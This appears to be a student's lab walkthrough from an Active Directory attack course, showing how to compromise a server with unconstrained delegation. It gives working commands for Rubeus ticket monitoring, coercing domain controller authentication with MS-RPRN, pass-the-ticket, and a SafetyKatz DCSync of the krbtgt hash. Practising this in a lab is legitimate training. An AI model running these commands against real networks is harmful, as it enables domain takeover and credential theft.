Compromise the server and escalate to Domain Admin privileges*
Use rubeus on the server to run on listener mode
```powershell
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
```
log in the server
```powershell
winrs -r:dcorp-appsrv cmd
```
Launch rubeus
```powershell
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
![[Pasted image 20231025163953.png]]
Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)
```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
Rubeus is triggered
![[Pasted image 20231025164204.png]]
Copy the ticket and use it with rubeus on the local machine
```powershell
C:\AD\Tools\Rubeus.exe ptt /ticket:<TICKET>
```
![[Pasted image 20231025164640.png]]
And launch safetykatz to dcsync
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<MACHINE>\krbtgt" "exit"
```
